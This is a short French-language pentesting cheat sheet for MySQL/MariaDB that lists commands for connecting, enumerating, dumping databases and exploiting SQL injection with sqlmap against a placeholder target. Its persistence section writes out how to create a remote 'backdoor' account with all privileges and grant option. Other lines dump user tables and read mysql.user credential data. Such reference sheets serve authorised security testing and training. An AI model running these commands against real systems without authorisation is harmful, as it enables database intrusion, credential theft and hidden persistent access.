```
# 🐬 MySQL / MariaDB - Cheatsheet Cyber Sécurité

Ce fichier regroupe les **commandes essentielles** et **outils** pour la post-exploitation, l'exploitation, et la persistance sur une base de données MySQL/MariaDB.

---

## 🔌 Connexion à la base

mysql -u root -p  
> Connexion locale avec mot de passe

mysql -h <ip> -u <user> -p  
> Connexion distante

---

## 🔍 Énumération

SHOW DATABASES;  
> Affiche les bases disponibles

USE <database>;  
> Sélectionner une base

SHOW TABLES;  
> Tables dans la base sélectionnée

DESCRIBE <table>;  
> Structure d'une table

SELECT * FROM <table> LIMIT 10;  
> Lire 10 entrées de la table

---

## 🔐 Création d'utilisateur / Persistance

CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ss';  
> Crée un utilisateur distant

GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;  
> Donne tous les droits

FLUSH PRIVILEGES;  
> Recharge les privilèges

---

## 📥 Dump de base de données

mysqldump -u root -p --all-databases > all.sql  
> Dump complet

mysqldump -u user -p database > dump.sql  
> Dump d'une base spécifique

---

## 📦 Exploitation avec sqlmap

sqlmap -u "http://target.com/index.php?id=1" --dbs  
> Détecte les bases disponibles

sqlmap -u "http://target.com/index.php?id=1" -D testdb --tables  
> Liste les tables de la base testdb

sqlmap -u "http://target.com/index.php?id=1" -D testdb -T users --dump  
> Dump la table `users`

---

## 🧪 Commandes utiles

SELECT version();  
> Version du serveur

SELECT user();  
> Nom de l'utilisateur connecté

SELECT @@hostname;  
> Nom de la machine

SELECT * FROM mysql.user;  
> Informations sur les utilisateurs (si accès root)

---

## 🛠️ Outils utiles

- **mysql** : client CLI
- **mysqldump** : dump de base
- **sqlmap** : automatisation des injections SQL
- **CrackMapExec** : bruteforce SQL sur réseau interne

---

## 📌 Ressources utiles

- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://gtfobins.github.io/gtfobins/mysql/
- https://book.hacktricks.xyz/pentesting-web/sql-injection
```
